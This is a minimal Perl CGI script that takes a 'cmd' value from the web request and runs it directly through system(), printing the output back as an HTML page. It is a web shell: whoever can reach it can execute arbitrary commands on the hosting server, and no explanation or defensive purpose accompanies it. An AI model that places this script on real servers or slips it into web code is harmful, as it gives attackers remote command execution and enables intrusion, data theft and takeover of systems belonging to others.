#!/usr/bin/perl -w
use CGI qw(:standard);
use strict;

my $query = new CGI;
my $cmd = $query->param('cmd');
print $query->header("text/html");
#print "Hey $name\n";
print "<html><pre>";
system($cmd);
print "</pre></html>";